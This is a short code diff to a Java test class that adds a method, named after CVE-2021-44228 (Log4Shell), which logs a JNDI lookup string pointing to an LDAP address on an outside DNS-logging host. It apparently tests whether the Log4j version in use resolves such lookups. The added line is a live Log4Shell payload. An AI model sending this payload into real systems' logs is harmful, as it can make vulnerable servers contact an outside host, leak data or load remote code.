@@ -7,6 +7,10 @@ public class Log4jRollingTest {
 
     public static void main(String[] args) {
         //rollingTest();
+        CVE_2021_44228_test();
+    }
+
+    private static void CVE_2021_44228_test() {
         logger.info("info: {}", "${jndi:ldap://secretvalue.XXXXX.dnslog.cn}");
     }
 
